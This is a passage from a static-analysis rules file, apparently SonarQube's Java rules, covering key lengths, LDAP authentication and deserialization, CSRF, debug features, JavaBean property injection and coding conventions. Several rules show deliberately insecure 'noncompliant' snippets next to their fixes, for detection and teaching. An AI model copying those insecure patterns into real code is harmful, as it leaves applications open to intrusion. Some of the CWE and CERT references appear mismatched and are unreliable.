            &lt;ul&gt;
            &lt;li&gt; p ≥ 2048 AND q ≥ 224 for DSA (&lt;code&gt;p&lt;/code&gt; is key length and &lt;code&gt;q&lt;/code&gt;
            the modulus length) &lt;/li&gt;
            &lt;li&gt; n ≥ 2048 for RSA (&lt;code&gt;n&lt;/code&gt; is the key length) &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;&lt;strong&gt;Key Agreement&lt;/strong&gt;: &lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; p ≥ 2048 AND q ≥ 224 for DH and MQV &lt;/li&gt;
            &lt;li&gt; n ≥ 224 for ECDH and ECMQV (Examples: &lt;code&gt;secp192r1&lt;/code&gt; is a non-compliant curve
            (&lt;code&gt;n&lt;/code&gt; &amp;lt; 224) but &lt;code&gt;secp224k1&lt;/code&gt; is
            compliant (&lt;code&gt;n&lt;/code&gt; &amp;gt;= 224)) &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;&lt;strong&gt;Symmetric keys&lt;/strong&gt;: &lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; key length ≥ 128 bits &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;This rule will not raise issues for ciphers that are considered weak (no matter the key size) like
            &lt;code&gt;DES&lt;/code&gt;, &lt;code&gt;Blowfish&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            KeyPairGenerator keyPairGen1 = KeyPairGenerator.getInstance(&quot;RSA&quot;);
            keyPairGen1.initialize(1024); // Noncompliant

            KeyPairGenerator keyPairGen5 = KeyPairGenerator.getInstance(&quot;EC&quot;);
            ECGenParameterSpec ecSpec1 = new ECGenParameterSpec(&quot;secp112r1&quot;); // Noncompliant
            keyPairGen5.initialize(ecSpec1);

            KeyGenerator keyGen1 = KeyGenerator.getInstance(&quot;AES&quot;);
            keyGen1.init(64); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            KeyPairGenerator keyPairGen6 = KeyPairGenerator.getInstance(&quot;RSA&quot;);
            keyPairGen6.initialize(2048); // Compliant

            KeyPairGenerator keyPairGen5 = KeyPairGenerator.getInstance(&quot;EC&quot;);
            ECGenParameterSpec ecSpec10 = new ECGenParameterSpec(&quot;secp256r1&quot;); // compliant
            keyPairGen5.initialize(ecSpec10);

            KeyGenerator keyGen2 = KeyGenerator.getInstance(&quot;AES&quot;);
            keyGen2.init(128); // Compliant
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure&quot;&gt;OWASP
            Top 10 2017 Category A3&lt;/a&gt; - Sensitive Data Exposure
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration&quot;&gt;OWASP
            Top 10 2017 Category A6&lt;/a&gt; - Security
            Misconfiguration &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf&quot;&gt;NIST
            800-131A&lt;/a&gt; - Recommendation for Transitioning the
            Use of Cryptographic Algorithms and Key Lengths &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/326.html&quot;&gt;MITRE, CWE-326&lt;/a&gt;
            - Inadequate Encryption Strength &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a3</tag>
        <tag>owasp-a6</tag>
        <tag>privacy</tag>
        <tag>rules</tag>
        <securityStandards>
            <cwe>326</cwe>
            <OWASP>A3,A6</OWASP>
        </securityStandards>
    </rule>

    <rule key='S4433' priority='CRITICAL'>
        <configKey>S4433</configKey>
        <name>LDAP connections should be authenticated</name>
        <description>
            &lt;p&gt;An LDAP client authenticates to an LDAP server with a &quot;bind request&quot; which provides,
            among other, a &lt;a
            href=&quot;https://ldapwiki.com/wiki/Simple%20Authentication&quot;&gt;simple authentication method&lt;/a&gt;.&lt;/p&gt;
            &lt;p&gt;Simple authentication in LDAP can be used with three different mechanisms:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;em&gt;Anonymous Authentication Mechanism&lt;/em&gt; by performing a bind request with a
            username and password value of zero length. &lt;/li&gt;
            &lt;li&gt; &lt;em&gt;Unauthenticated Authentication Mechanism&lt;/em&gt; by performing a bind request with a
            password value of zero length. &lt;/li&gt;
            &lt;li&gt; &lt;em&gt;Name/Password Authentication Mechanism&lt;/em&gt; by performing a bind request with a
            password value of non-zero length. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Anonymous binds and unauthenticated binds allow access to information in the LDAP directory without
            providing a password, their use is therefore
            strongly discouraged. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;p&gt;This rule raises an issue when an LDAP connection is created with &lt;code&gt;Context.SECURITY_AUTHENTICATION&lt;/code&gt;
            set to &lt;code&gt;&quot;none&quot;&lt;/code&gt;.&lt;/p&gt;
            &lt;pre&gt;
            // Set up the environment for creating the initial context
            Hashtable&amp;lt;String, Object&amp;gt; env = new Hashtable&amp;lt;String, Object&amp;gt;();
            env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.ldap.LdapCtxFactory&quot;);
            env.put(Context.PROVIDER_URL, &quot;ldap://localhost:389/o=JNDITutorial&quot;);

            // Use anonymous authentication
            env.put(Context.SECURITY_AUTHENTICATION, &quot;none&quot;); // Noncompliant

            // Create the initial context
            DirContext ctx = new InitialDirContext(env);
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            // Set up the environment for creating the initial context
            Hashtable&amp;lt;String, Object&amp;gt; env = new Hashtable&amp;lt;String, Object&amp;gt;();
            env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.ldap.LdapCtxFactory&quot;);
            env.put(Context.PROVIDER_URL, &quot;ldap://localhost:389/o=JNDITutorial&quot;);

            // Use simple authentication
            env.put(Context.SECURITY_AUTHENTICATION, &quot;simple&quot;);
            env.put(Context.SECURITY_PRINCIPAL, &quot;cn=S. User, ou=NewHires, o=JNDITutorial&quot;);
            env.put(Context.SECURITY_CREDENTIALS, getLDAPPassword());

            // Create the initial context
            DirContext ctx = new InitialDirContext(env);
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication&quot;&gt;OWASP
            Top 10 2017 Category A2&lt;/a&gt; - Broken Authentication &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/521.html&quot;&gt;CWE-521&lt;/a&gt; -
            Weak Password Requirements &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://ldapwiki.com/wiki/Simple%20Authentication&quot;&gt;ldapwiki.com&lt;/a&gt;-
            Simple Authentication &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a2</tag>
        <securityStandards>
            <cwe>521</cwe>
            <OWASP>A2</OWASP>
        </securityStandards>
    </rule>

    <rule key='S4434' priority='MAJOR'>
        <configKey>S4434</configKey>
        <name>Allowing deserialization of LDAP objects is security-sensitive</name>
        <description>
            &lt;p&gt;JNDI supports the deserialization of objects from LDAP directories, which can lead to remote code
            execution.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when an LDAP search query is executed with &lt;code&gt;SearchControls&lt;/code&gt;
            configured to allow deserialization.&lt;/p&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; The application connects to an untrusted LDAP directory. &lt;/li&gt;
            &lt;li&gt; User-controlled objects can be stored in the LDAP directory. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;p&gt;It is recommended to disable deserialization of LDAP objects.&lt;/p&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;pre&gt;
            DirContext ctx = new InitialDirContext();
            // ...
            ctx.search(query, filter,
            new SearchControls(scope, countLimit, timeLimit, attributes,
            true, // Noncompliant; allows deserialization
            deref));
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            DirContext ctx = new InitialDirContext();
            // ...
            ctx.search(query, filter,
            new SearchControls(scope, countLimit, timeLimit, attributes,
            false, // Compliant
            deref));
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/502.html&quot;&gt;MITRE, CWE-502&lt;/a&gt;
            - Deserialization of Untrusted Data &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization&quot;&gt;OWASP
            Top 10 2017 Category A8&lt;/a&gt; - Insecure Deserialization
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf&quot;&gt;BlackHat
            presentation&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; Derived from FindSecBugs rule &lt;a href=&quot;https://find-sec-bugs.github.io/bugs.htm#LDAP_ENTRY_POISONING&quot;&gt;LDAP_ENTRY_POISONING&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a8</tag>
        <securityStandards>
            <cwe>502</cwe>
            <OWASP>A8</OWASP>
        </securityStandards>
    </rule>

    <rule key='S4449' priority='MAJOR'>
        <configKey>S4449</configKey>
        <name>Nullness of parameters should be guaranteed</name>
        <description>
            &lt;p&gt;When using null-related annotations at global scope level, for instance using &lt;code&gt;javax.annotation.ParametersAreNonnullByDefault&lt;/code&gt;
            (from
            JSR-305) at package level, it means that all the parameters to all the methods included in the package will,
            or should, be considered
            Non-&lt;code&gt;null&lt;/code&gt;. It is equivalent to annotating every parameter in every method with
            non-null annotations (such as &lt;code&gt;@Nonnull&lt;/code&gt;).&lt;/p&gt;
            &lt;p&gt;The rule raises an issue every time a parameter could be &lt;code&gt;null&lt;/code&gt; for a method
            invocation, where the method is annotated as forbidding
            null parameters.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @javax.annotation.ParametersAreNonnullByDefault
            class A {

            void foo() {
            bar(getValue()); // Noncompliant - method 'bar' do not expect 'null' values as parameter
            }

            void bar(Object o) { // 'o' is by contract expected never to be null
            // ...
            }

            @javax.annotation.CheckForNull
            abstract Object getValue();
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;p&gt;Two solutions are possible: &lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; The signature of the method is correct, and null check should be done prior to the call. &lt;/li&gt;
            &lt;li&gt; The signature of the method is not coherent and should be annotated to allow null values being
            passed as parameter &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            @javax.annotation.ParametersAreNonnullByDefault
            abstract class A {

            void foo() {
            Object o = getValue();
            if (o != null) {
            bar(o); // Compliant - 'o' can not be null
            }
            }

            void bar(Object o) {
            // ...
            }

            @javax.annotation.CheckForNull
            abstract Object getValue();
            }
            &lt;/pre&gt;
            &lt;p&gt;or &lt;/p&gt;
            &lt;pre&gt;
            @javax.annotation.ParametersAreNonnullByDefault
            abstract class A {

            void foo() {
            bar(getValue());
            }

            void bar(@javax.annotation.Nullable Object o) { // annotation was missing
            // ...
            }

            @javax.annotation.CheckForNull
            abstract Object getValue();
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S4454' priority='CRITICAL'>
        <configKey>S4454</configKey>
        <name>&quot;equals&quot; method parameters should not be marked &quot;@Nonnull&quot;</name>
        <description>
            &lt;p&gt;By contract, the &lt;code&gt;equals(Object)&lt;/code&gt; method, from &lt;code&gt;java.lang.Object&lt;/code&gt;,
            should accept a &lt;code&gt;null&lt;/code&gt; argument. Among all the
            other cases, the &lt;code&gt;null&lt;/code&gt; case is even explicitly detailed in the &lt;code&gt;Object.equals(...)&lt;/code&gt;
            Javadoc, stating &lt;em&gt;&quot;For any non-null
            reference value x, x.equals(null) should return false.&quot;&lt;/em&gt;&lt;/p&gt;
            &lt;p&gt;Assuming that the argument to &lt;code&gt;equals&lt;/code&gt; is always non-null, and enforcing
            that assumption with an annotation is not only a fundamental
            violation of the contract of &lt;code&gt;equals&lt;/code&gt;, but it is also likely to cause problems in the
            future as the use of the class evolves over time.&lt;/p&gt;
            &lt;p&gt;The rule raises an issue when the &lt;code&gt;equals&lt;/code&gt; method is overridden and its
            parameter annotated with any kind of &lt;code&gt;@Nonnull&lt;/code&gt;
            annotation.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public boolean equals(@javax.annotation.Nonnull Object obj) { // Noncompliant
            // ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public boolean equals(Object obj) {
            if (obj == null) {
            return false;
            }
            // ...
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S4488' priority='MINOR'>
        <configKey>S4488</configKey>
        <name>Composed &quot;@RequestMapping&quot; variants should be preferred</name>
        <description>
            &lt;p&gt;Spring framework 4.3 introduced variants of the &lt;code&gt;@RequestMapping&lt;/code&gt; annotation
            to better represent the semantics of the annotated methods.
            The use of &lt;code&gt;@GetMapping&lt;/code&gt;, &lt;code&gt;@PostMapping&lt;/code&gt;, &lt;code&gt;@PutMapping&lt;/code&gt;,
            &lt;code&gt;@PatchMapping&lt;/code&gt; and &lt;code&gt;@DeleteMapping&lt;/code&gt;
            should be preferred to the use of the raw &lt;code&gt;@RequestMapping(method = RequestMethod.XYZ)&lt;/code&gt;.&lt;/p&gt;
            &lt;h1&gt;Noncompliant Code Example&lt;/h1&gt;
            &lt;pre&gt;
            @RequestMapping(path = &quot;/greeting&quot;, method = RequestMethod.GET) // Noncompliant
            public Greeting greeting(@RequestParam(value = &quot;name&quot;, defaultValue = &quot;World&quot;) String
            name) {
            ...
            }
            &lt;/pre&gt;
            &lt;h1&gt;Compliant Solution&lt;/h1&gt;
            &lt;pre&gt;
            @GetMapping(path = &quot;/greeting&quot;) // Compliant
            public Greeting greeting(@RequestParam(value = &quot;name&quot;, defaultValue = &quot;World&quot;) String
            name) {
            ...
            }
            &lt;/pre&gt;
        </description>
        <tag>spring</tag>
    </rule>

    <rule key='S4502' priority='CRITICAL'>
        <configKey>S4502</configKey>
        <name>Disabling CSRF protections is security-sensitive</name>
        <description>
            &lt;p&gt;A cross-site request forgery (CSRF) attack occurs when a trusted user of a web application can be
            forced, by an attacker, to perform sensitive
            actions that he didn't intend, such as updating his profile or sending a message, more generally anything
            that can change the state of the
            application.&lt;/p&gt;
            &lt;p&gt;The attacker can trick the user/victim to click on a link, corresponding to the privileged action,
            or to visit a malicious web site that embeds a
            hidden web request and as web browsers automatically include cookies, the actions can be authenticated and
            sensitive.&lt;/p&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; The web application uses cookies to authenticate users. &lt;/li&gt;
            &lt;li&gt; There exist sensitive operations in the web application that can be performed when the user is
            authenticated. &lt;/li&gt;
            &lt;li&gt; The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE
            requests for example. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; Protection against CSRF attacks is strongly recommended:
            &lt;ul&gt;
            &lt;li&gt; to be activated by default for all &lt;a href=&quot;https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods&quot;&gt;unsafe
            HTTP
            methods&lt;/a&gt;. &lt;/li&gt;
            &lt;li&gt; implemented, for example, with an unguessable CSRF token &lt;/li&gt;
            &lt;/ul&gt; &lt;/li&gt;
            &lt;li&gt; Of course all sensitive operations should not be performed with &lt;a
            href=&quot;https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods&quot;&gt;safe HTTP&lt;/a&gt;
            methods like &lt;code&gt;GET&lt;/code&gt; which are designed to be
            used only for information retrieval. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;p&gt;&lt;a href=&quot;https://docs.spring.io/spring-security/site/docs/3.2.0.CI-SNAPSHOT/reference/html/csrf.html&quot;&gt;Spring
            Security&lt;/a&gt; provides by default a
            protection against CSRF attacks which can be disabled:&lt;/p&gt;
            &lt;pre&gt;
            @EnableWebSecurity
            public class WebSecurityConfig extends WebSecurityConfigurerAdapter {

            @Override
            protected void configure(HttpSecurity http) throws Exception {
            http.csrf().disable(); // Sensitive: csrf protection is entirely disabled
            // or
            http.csrf().ignoringAntMatchers(&quot;/route/&quot;); // Sensitive: csrf protection is disabled for specific
            routes
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;p&gt;&lt;a href=&quot;https://docs.spring.io/spring-security/site/docs/3.2.0.CI-SNAPSHOT/reference/html/csrf.html&quot;&gt;Spring
            Security&lt;/a&gt; CSRF protection is
            enabled by default, do not disable it:&lt;/p&gt;
            &lt;pre&gt;
            @EnableWebSecurity
            public class WebSecurityConfig extends WebSecurityConfigurerAdapter {

            @Override
            protected void configure(HttpSecurity http) throws Exception {
            // http.csrf().disable(); // Compliant
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/352.html&quot;&gt;MITRE, CWE-352&lt;/a&gt;
            - Cross-Site Request Forgery (CSRF) &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration&quot;&gt;OWASP
            Top 10 2017 Category A6&lt;/a&gt; - Security
            Misconfiguration &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://owasp.org/www-community/attacks/csrf&quot;&gt;OWASP: Cross-Site Request
            Forgery&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.sans.org/top25-software-errors/#cat1&quot;&gt;SANS Top 25&lt;/a&gt;
            - Insecure Interaction Between Components &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a6</tag>
        <tag>sans-top25-insecure</tag>
        <tag>spring</tag>
        <securityStandards>
            <cwe>352</cwe>
            <OWASP>A6</OWASP>
        </securityStandards>
    </rule>

    <rule key='S4507' priority='MINOR'>
        <configKey>S4507</configKey>
        <name>Delivering code in production with debug features activated is security-sensitive</name>
        <description>
            &lt;p&gt;Delivering code in production with debug features activated is security-sensitive. It has led in
            the past to the following vulnerabilities:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1999007&quot;&gt;CVE-2018-1999007&lt;/a&gt;
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5306&quot;&gt;CVE-2015-5306&lt;/a&gt;
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2006&quot;&gt;CVE-2013-2006&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;An application's debug features enable developers to find bugs more easily and thus facilitate also
            the work of attackers. It often gives access to
            detailed information on both the system running the application and users. &lt;/p&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; the code or configuration enabling the application debug features is deployed on production
            servers. &lt;/li&gt;
            &lt;li&gt; the application runs by default with debug features activated. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;p&gt;Do not enable debug features on production servers.&lt;/p&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;p&gt;&lt;code&gt;Throwable.printStackTrace(...)&lt;/code&gt; prints a Throwable and its stack trace to
            &lt;code&gt;System.Err&lt;/code&gt; (by default) which is not easily
            parseable and can expose sensitive information:&lt;/p&gt;
            &lt;pre&gt;
            try {
            /* ... */
            } catch(Exception e) {
            e.printStackTrace(); // Sensitive
            }
            &lt;/pre&gt;
            &lt;p&gt;&lt;a
            href=&quot;https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/config/annotation/web/configuration/EnableWebSecurity.html&quot;&gt;EnableWebSecurity&lt;/a&gt;
            annotation for SpringFramework with &lt;code&gt;debug&lt;/code&gt; to &lt;code&gt;true&lt;/code&gt; enable
            debugging support:&lt;/p&gt;
            &lt;pre&gt;
            import org.springframework.context.annotation.Configuration;
            import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;

            @Configuration
            @EnableWebSecurity(debug = true) // Sensitive
            public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
            // ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;p&gt;Loggers should be used (instead of &lt;code&gt;printStackTrace&lt;/code&gt;) to print throwables:&lt;/p&gt;
            &lt;pre&gt;
            try {
            /* ... */
            } catch(Exception e) {
            LOGGER.log(&quot;context&quot;, e); // Compliant
            }
            &lt;/pre&gt;
            &lt;p&gt;&lt;a
            href=&quot;https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/config/annotation/web/configuration/EnableWebSecurity.html&quot;&gt;EnableWebSecurity&lt;/a&gt;
            annotation for SpringFramework with &lt;code&gt;debug&lt;/code&gt; to &lt;code&gt;false&lt;/code&gt; disable
            debugging support:&lt;/p&gt;
            &lt;pre&gt;
            import org.springframework.context.annotation.Configuration;
            import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;

            @Configuration
            @EnableWebSecurity(debug = false) // Compliant
            public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
            // ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure&quot;&gt;OWASP
            Top 10 2017 Category A3&lt;/a&gt; - Sensitive Data Exposure
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/489.html&quot;&gt;MITRE, CWE-489&lt;/a&gt;
            - Leftover Debug Code &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/215.html&quot;&gt;MITRE, CWE-215&lt;/a&gt;
            - Information Exposure Through Debug Information &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>debug</tag>
        <tag>error-handling</tag>
        <tag>owasp-a3</tag>
        <tag>spring</tag>
        <tag>user-experience</tag>
        <securityStandards>
            <cwe>502</cwe>
            <OWASP>A3</OWASP>
        </securityStandards>
    </rule>

    <rule key='S4512' priority='CRITICAL'>
        <configKey>S4512</configKey>
        <name>Setting JavaBean properties is security-sensitive</name>
        <description>
            &lt;p&gt;Setting JavaBean properties is security sensitive. Doing it with untrusted values has led in the
            past to the following vulnerability:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0114&quot;&gt;CVE-2014-0114&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;JavaBeans can have their properties or nested properties set by population functions. An attacker
            can leverage this feature to push into the
            JavaBean malicious data that can compromise the software integrity. A typical attack will try to manipulate
            the ClassLoader and finally execute
            malicious code.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; BeanUtils.populate(...) or BeanUtilsBean.populate(...) from &lt;a href=&quot;http://commons.apache.org/proper/commons-beanutils/&quot;&gt;Apache
            Commons
            BeanUtils&lt;/a&gt; are called &lt;/li&gt;
            &lt;li&gt; BeanUtils.setProperty(...) or BeanUtilsBean.setProperty(...) from &lt;a href=&quot;http://commons.apache.org/proper/commons-beanutils/&quot;&gt;Apache
            Commons
            BeanUtils&lt;/a&gt; are called &lt;/li&gt;
            &lt;li&gt; org.springframework.beans.BeanWrapper.setPropertyValue(...) or
            org.springframework.beans.BeanWrapper.setPropertyValues(...) from Spring is
            called &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; the new property values might have been tampered with or provided by an untrusted source. &lt;/li&gt;
            &lt;li&gt; sensitive properties can be modified, for example: &lt;code&gt;class.classLoader&lt;/code&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;p&gt;Sanitize all values used as JavaBean properties.&lt;/p&gt;
            &lt;p&gt;Don't set any sensitive properties. Keep full control over which properties are set. If the
            property names are provided by an unstrusted source,
            filter them with a whitelist.&lt;/p&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Company bean = new Company();
            HashMap map = new HashMap();
            Enumeration names = request.getParameterNames();
            while (names.hasMoreElements()) {
            String name = (String) names.nextElement();
            map.put(name, request.getParameterValues(name));
            }
            BeanUtils.populate(bean, map); // Sensitive: &quot;map&quot; is populated with data coming from user input,
            here &quot;request.getParameterNames()&quot;
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A1-Injection&quot;&gt;OWASP Top 10
            2017 Category A1&lt;/a&gt; - Injection &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/15.html&quot;&gt;MITRE, CWE-15&lt;/a&gt; -
            External Control of System or Configuration Setting &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/hDdGBQ&quot;&gt;CERT, MSC61-J.&lt;/a&gt; -
            Do not use insecure or weak cryptographic algorithms &lt;/li&gt;
            &lt;li&gt; Derived from FindSecBugs rule &lt;a href=&quot;https://find-sec-bugs.github.io/bugs.htm#BEAN_PROPERTY_INJECTION&quot;&gt;BEAN_PROPERTY_INJECTION&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>owasp-a1</tag>
        <securityStandards>
            <cwe>15</cwe>
            <OWASP>A1</OWASP>
        </securityStandards>
    </rule>

    <rule key='S4517' priority='MAJOR'>
        <configKey>S4517</configKey>
        <name>InputSteam.read() implementation should not return a signed byte</name>
        <description>
            &lt;p&gt;According to the Java documentation, any implementation of the &lt;code&gt;InputSteam.read()&lt;/code&gt;
            method is supposed to read the next byte of data from
            the input stream. The value byte must be an &lt;code&gt;int&lt;/code&gt; in the range 0 to 255. If no byte
            is available because the end of the stream has been
            reached, the value -1 is returned.&lt;/p&gt;
            &lt;p&gt;But in Java, the &lt;code&gt;byte&lt;/code&gt; primitive data type is an 8-bit signed two's
            complement integer. It has a minimum value of -128 and a maximum
            value of 127. So by contract, the implementation of an &lt;code&gt;InputSteam.read()&lt;/code&gt; method
            should never directly return a &lt;code&gt;byte&lt;/code&gt;
            primitive data type. A conversion into an unsigned byte must be done before by applying a bitmask.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @Override
            public int read() throws IOException {
            if (pos == buffer.length()) {
            return -1;
            }
            return buffer.getByte(pos++); // Noncompliant, a signed byte value is returned
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            @Override
            public int read() throws IOException {
            if (pos == buffer.length()) {
            return -1;
            }
            return buffer.getByte(pos++) &amp;amp; 0xFF; // The 0xFF bitmask is applied
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S4524' priority='CRITICAL'>
        <configKey>S4524</configKey>
        <name>&quot;default&quot; clauses should be last</name>
        <description>
            &lt;p&gt;&lt;code&gt;switch&lt;/code&gt; can contain a &lt;code&gt;default&lt;/code&gt; clause for various
            reasons: to handle unexpected values, to show that all the cases were
            properly considered.&lt;/p&gt;
            &lt;p&gt;For readability purpose, to help a developer to quickly find the default behavior of a &lt;code&gt;switch&lt;/code&gt;
            statement, it is recommended to put the
            &lt;code&gt;default&lt;/code&gt; clause at the end of the &lt;code&gt;switch&lt;/code&gt; statement. This
            rule raises an issue if the &lt;code&gt;default&lt;/code&gt; clause is not the
